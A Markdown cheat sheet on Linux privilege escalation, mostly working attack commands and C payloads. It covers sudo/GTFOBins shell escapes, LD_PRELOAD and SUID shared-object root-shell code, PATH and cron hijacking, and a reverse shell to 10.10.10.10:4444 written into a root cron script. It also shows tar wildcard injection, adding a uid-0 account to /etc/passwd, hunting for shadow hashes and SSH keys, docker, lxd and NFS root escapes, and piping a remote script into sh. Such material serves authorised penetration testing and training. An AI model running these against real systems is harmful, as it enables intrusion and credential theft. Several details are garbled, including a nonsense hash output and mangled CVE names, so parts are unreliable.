# This technical guide covers the most used and common privilege escalation vectors in linux

---

## 1. Sudo Abuse & GTFOBins

`sudo` allows users to run commands with elevated privileges (typically `root`). Misconfigurations happen when users are granted permission to run binaries that allow shell escapes or file modifications.

### A. GTFOBins Shell Escapes

* **Logic:** The command allowed in `/etc/sudoers` has built-in execution flags, interactive prompts, or script evaluation that allow spawning a subshell.
* **Enumeration:**
```bash
sudo -l

```


* **Exploit Example (`find` binary):**
If `sudo -l` shows `(root) NOPASSWD: /usr/bin/find`:
```bash
sudo find . -exec /bin/sh \; -quit

```


* **Exploit Example (`vim` binary):**
If `sudo -l` shows `(root) NOPASSWD: /usr/bin/vim`:
```bash
sudo vim -c ':!/bin/sh'

```


* **Source:** [GTFOBins Main Repository](https://gtfobins.github.io/)

---

### B. Environment Preservation (`LD_PRELOAD` / `env_keep`)

* **Logic:** If `/etc/sudoers` contains `env_keep += LD_PRELOAD`, `sudo` retains the `LD_PRELOAD` environment variable. This allows loading a custom shared library (`.so`) *before* any other library when the target binary runs under `sudo`.
* **Enumeration:**
Look for `env_keep += LD_PRELOAD` in the output of `sudo -l`:
```text
Matching Defaults entries for user on target:
    env_reset, env_keep+=LD_PRELOAD

```


* **Exploit Example:**
1. Create `pe.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}

```


2. Compile and execute:
```bash
gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/allowed_binary

```




* **Source:** [HackTricks - Sudo Environment Variables](https://www.google.com/search?q=https://book.hacktricks.xyz/linux-hardening/privilege-escalation%23sudo-and-suid)

---

## 2. SUID / SGID Executables

Set Owner User ID (`SUID`) and Set Group ID (`SGID`) are file permission flags that force an executable to run with the privileges of the file owner (or group) rather than the user executing it.

### A. GTFOBins SUID Binaries

* **Logic:** A binary owned by `root` with the SUID bit set (`-rwsr-xr-x`) contains native functionality to read files, write files, or execute arbitrary commands.
* **Enumeration:**
```bash
find / -perm -4000 -type f -ls 2>/dev/null

```


* **Exploit Example (`base64` binary):**
If `/usr/bin/base64` has SUID root set, read sensitive files like `/etc/shadow`:
```bash
/usr/bin/base64 "/etc/shadow" | base64 --decode

```


* **Source:** [GTFOBins SUID Filter](https://www.google.com/search?q=https://gtfobins.github.io/%23%2Bsuid)

---

### B. Shared Object (`.so`) Injection in SUID Binaries

* **Logic:** A custom SUID binary attempts to load a shared library (`.so`) from a path where it is missing, or looks in directories where the current user has write access.
* **Enumeration:**
Inspect shared library dependencies and missing files using `strace` (if available) or `ldd`:
```bash
strace /usr/local/bin/suid_custom 2>&1 | grep -i -E "open|access|no such file"

```


* **Exploit Example:**
If the output shows a missing file `/tmp/libcalc.so`:
1. Compile malicious shared object to `/tmp/libcalc.so`:
```c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    setuid(0);
    system("/bin/sh");
}

```


```bash
gcc -shared -fPIC -o /tmp/libcalc.so /tmp/libcalc.c

```


2. Run `/usr/local/bin/suid_custom` to trigger execution.


* **Source:** [PayloadsAllTheThings - Shared Object Injection](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Linux%2520-%2520Privilege%2520Escalation/README.md%23shared-object-injection)

---

### C. PATH Environment Variable Hijacking

* **Logic:** An SUID binary calls a system command (e.g., `service`, `cat`, `curl`) without specifying its full absolute path (e.g., calling `service` instead of `/usr/sbin/service`).
* **Enumeration:**
Inspect strings inside the binary:
```bash
strings /usr/local/bin/suid_binary

```


* **Exploit Example:**
If `strings` reveals a call to `service nginx status`:
```bash
cd /tmp
echo '/bin/sh' > service
chmod +x service
export PATH=/tmp:$PATH
/usr/local/bin/suid_binary

```


* **Source:** [HackTricks - PATH Hijacking](https://www.google.com/search?q=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/path-abuse)

---

## 3. Linux Capabilities

Capabilities break down traditional `root` privileges into distinct units (e.g., `CAP_SETUID`, `CAP_DAC_READ_SEARCH`). If assigned directly to an executable, the binary gains specific root permissions without full SUID elevation.

* **Logic:** Fine-grained privileges can be exploited if attached to interpreters or file management binaries.
* **Enumeration:**
```bash
getcap -r / 2>/dev/null

```



### Exploit Examples

* **`cap_setuid+ep` on Python:**
If `/usr/bin/python3 = cap_setuid+ep`:
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

```


* **`cap_dac_read_search+ep` on Tar:**
Allows bypassing file read permissions across the system. Read `/etc/shadow`:
```bash
tar -cvzf shadow.tar.gz /etc/shadow
tar -xvf shadow.tar.gz

```


* **Source:** [Linux Manual Pages - capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) | [HackTricks - Linux Capabilities](https://www.google.com/search?q=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

---

## 4. Scheduled Tasks & Cron Jobs

Cron jobs execute scripts automatically under the context of the task owner (often `root`).

### A. Writable Cron Scripts

* **Logic:** A `root` cron job executes a script file that is writable by lower-privileged users.
* **Enumeration:**
```bash
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null

```


* **Exploit Example:**
If `/etc/crontab` shows `* * * * * root /opt/backup.sh`:
```bash
ls -la /opt/backup.sh
# If writable by current user:
echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /opt/backup.sh

```



---

### B. Cron PATH Abuse

* **Logic:** The `PATH` defined at the top of `/etc/crontab` includes a directory writable by a non-root user (e.g., `/usr/local/bin`), and a cron job calls a binary using a relative path.
* **Enumeration:**
Check the `PATH` line in `/etc/crontab`:
```text
PATH=/usr/local/bin:/usr/bin:/bin
* * * * * root cleanup.sh

```


* **Exploit Example:**
If `/usr/local/bin` is writable by `www-data`:
```bash
echo '#!/bin/bash' > /usr/local/bin/cleanup.sh
echo 'chmod +s /bin/bash' >> /usr/local/bin/cleanup.sh
chmod +x /usr/local/bin/cleanup.sh

```



---

### C. Wildcard Injection in Cron Commands

* **Logic:** A cron job uses a wildcard `*` with commands like `tar`, `rsync`, or `chown`. Command line flags can be injected by creating files whose names match command-line options.
* **Enumeration:**
Example cron entry:
```text
* * * * * root cd /var/www/html && tar -cf /var/backups/archive.tar *

```


* **Exploit Example (`tar` option injection):**
1. Create payload and trigger files inside `/var/www/html`:
```bash
echo 'chmod +s /bin/bash' > /var/www/html/run.sh
chmod +x /var/www/html/run.sh
touch -- /var/www/html/"--checkpoint=1"
touch -- /var/www/html/"--checkpoint-action=exec=sh run.sh"

```


2. When cron executes `tar -cf ... *`, the wildcard expands filenames into command options:
`tar -cf /var/backups/archive.tar --checkpoint=1 --checkpoint-action=exec=sh run.sh ...`


* **Source:** [PayloadsAllTheThings - Cron Wildcards](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Linux%2520-%2520Privilege%2520Escalation/README.md%23cron-jobs)

---

## 5. File Permissions & Credential Hunting

### A. Writable Configuration Files (`/etc/passwd` or `/etc/shadow`)

* **Logic:** If `/etc/passwd` is writable, you can append a new account with uid `0`. If `/etc/shadow` is readable, you can dump root password hashes for offline cracking.
* **Enumeration:**
```bash
ls -l /etc/passwd /etc/shadow

```


* **Exploit Example (Writable `/etc/passwd`):**
1. Generate password hash for `password123`:
```bash
openssl passwd -1 -salt root2 password123
# Output: $1$root2$192.168.1.1...

```


2. Append new user line to `/etc/passwd`:
```bash
echo 'root2:$1$root2$192.168.1.1...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2

```





---

### B. Credential Harvesting (Files, Memory, Configs)

* **Logic:** Hardcoded credentials in Web roots, configuration files, SSH keys, or command history.
* **Key Commands:**
```bash
# History files
cat ~/.bash_history ~/.zsh_history

# Search for plain text password strings in web root or configs
grep -rnI "password" /var/www/ /etc/ 2>/dev/null

# Search for readable private SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

```


* **Source:** [HackTricks - Sensitive Data Hunting](https://www.google.com/search?q=https://book.hacktricks.xyz/linux-hardening/privilege-escalation%23credentials-and-sensitive-data)

---

## 6. Network File System (NFS) Misconfigurations

NFS shares exported with weak security flags can allow root privilege mapping.

* **Logic:** The `no_root_squash` directive in `/etc/exports` tells the NFS server to trust remote client user IDs. A user running as `root` on their local attack machine will map to `root` on the remote NFS file share.
* **Enumeration:**
```bash
cat /etc/exports

```


*Target Output:*
```text
/tmp/share *(rw,sync,no_root_squash)

```


* **Exploit Walkthrough:**
1. On Attack Machine (as local `root`):
```bash
mkdir /mnt/target
mount -t nfs <TARGET_IP>:/tmp/share /mnt/target
cp /bin/bash /mnt/target/bash
chmod +s /mnt/target/bash

```


2. On Target Machine (as low-priv user):
```bash
/tmp/share/bash -p

```




* **Source:** [HackTricks - NFS Privilege Escalation](https://www.google.com/search?q=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration)

---

## 7. Group-Based Privileges (Docker, LXC, Disk)

Belonging to specific secondary Linux groups often grants indirect administrative control over the filesystem or host kernel.

```bash
id
# Example output: uid=1000(user) gid=1000(user) groups=1000(user),999(docker),108(lxd),6(disk)

```

### A. Docker Group

* **Logic:** Members of the `docker` group can interact with the Docker daemon API, which runs as `root`. This allows mounting the root filesystem `/` inside a container.
* **Exploit Example:**
```bash
docker run -v /:/host -it ubuntu bash
# Inside container:
chroot /host

```



---

### B. LXD / LXC Group

* **Logic:** Members of `lxd` can create containers, mount host storage inside them, and access the host files as root.
* **Exploit Example:**
1. Import Alpine image on attack box, transfer to target:
```bash
lxc image import alpine.tar.gz --alias myalpine
lxc init myalpine mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh

```


2. Root filesystem is available under `/mnt/root`.



---

### C. Disk Group

* **Logic:** The `disk` group allows raw block-level read/write access to device files (e.g., `/dev/sda1`).
* **Exploit Example:**
Use `debugfs` to extract sensitive files directly from the block partition:
```bash
debugfs /dev/sda1
# Inside debugfs:
cat /etc/shadow

```


* **Source:** [GTFOBins - Docker](https://gtfobins.github.io/gtfobins/docker/) | [HackTricks - LXD Privilege Escalation](https://www.google.com/search?q=https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)

---

## 8. Kernel Exploitation

Exploiting unpatched vulnerabilities in the Linux kernel core or kernel modules to gain arbitrary memory execution.

* **Logic:** Kernel vulnerabilities (e.g., Use-After-Free, Out-Of-Bounds Read/Write) crash security structures in memory (such as `cred` structures) to force process UIDs to `0`.
* **Enumeration:**
Check kernel version and OS architecture:
```bash
uname -a
cat /etc/os-release

```



### Notable Kernel Vulnerabilities

| Name | CVE | Affected Kernel Range | Description |
| --- | --- | --- | --- |
| **Dirty COW** | CVE-2016-5195 | 2.6.22 - 4.8.3 | Race condition in copy-on-write (COW) mechanism allows overwriting read-only memory mappings. |
| **Dirty Pipe** | CVE-2022-0847 | 5.8 - 5.16.11 / 5.15.25 | Uninitialized flag in pipe buffer structure allows overwriting data in read-only files. |
| **PONT / Baron Samedit** | CVE-2021-3156 | Sudo < 1.9.5p2 | Heap-based buffer overflow in `sudo` command line parsing. |
| **Pkit-Pwnkit** | CVE-2021-4034 | All Polkit versions | Out-of-bounds read/write in `pkexec`. |

* **Methodology:**
1. Identify kernel release: `uname -r`.
2. Search exploit databases (`searchsploit`, GitHub).
3. Compile exploit locally or on target, run with target parameter arguments.


* **Sources:** [Linux Kernel Security Documentation](https://www.google.com/search?q=https://www.kernel.org/doc/html/latest/security/index.html) | [Exploit Database](https://www.exploit-db.com/)

---

## 9. Automated Vector Analyzers Guide

Manual enumeration is thorough, but automated scripts drastically accelerate finding misconfigurations.

### Primary Automation Tools

| Tool | Purpose | Primary Strength |
| --- | --- | --- |
| **LinPEAS** | Automated Enum | Comprehensive output with highlighted colors for high-probability vectors. |
| **LSE (Linux Smart Enum)** | System Auditing | Output levels (0-2) tuned for CTFs and OSCP style assessments. |
| **LinEnum** | Classic Enum | Lightweight legacy bash script requiring zero dependencies. |
| **pspy** | Process Monitoring | Sniffs execution events without needing root permissions. |

---

### LinPEAS Deep-Dive Guide

LinPEAS (`linpeas.sh`) scans the system against hundreds of known privilege escalation paths and prints color-coded findings.

#### 1. Transfer & Execution Methods

* **Method A: Direct Memory Pipe (Fileless Execution)**
```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

```


* **Method B: Local Web Server Transfer**
On Attack Box:
```bash
python3 -m http.server 8000

```


On Target Machine:
```bash
wget http://<ATTACK_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a > /tmp/linpeas.log

```



#### 2. Interpreting the Output Color Palette

LinPEAS uses specific color combinations to rank risk levels:

* **RED / YELLOW Background:** 99% probability of privilege escalation vector. **Focus here first.**
* **RED:** High priority finding (misconfigurations, passwords, SUID binaries).
* **GREEN:** Common enabled security controls or clean output.
* **BLUE:** Information/Informational elements.

```text
[!] Legend:
    RED/YELLOW  : Very high probability PE vector
    RED         : Important finding
    BLUE        : Informational

```

#### 3. Targeted LinPEAS Flags

To minimize noise during assessment runs:

```bash
# Fast mode (skips heavy checks)
./linpeas.sh -q

# Execute specific checks only (e.g., sudo and cron)
./linpeas.sh -s -s

# Write output clean ANSI color logs for viewing with `less -r`
./linpeas.sh -a > linpeas.log
less -r linpeas.log

```

---

### Process Monitoring with `pspy`

When LinPEAS yields no direct vectors, run `pspy` to monitor short-lived cron jobs or admin processes in real time:

1. Download the static binary:
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64

```


2. Run in terminal and watch process execution logs:
```bash
./pspy64

```


3. Look for commands executed periodically by UID `0` (root).

* **Source:** [PEASS-ng / LinPEAS Official Repository](https://github.com/peass-ng/PEASS-ng) | [pspy Official Repository](https://github.com/DominicBreuker/pspy)
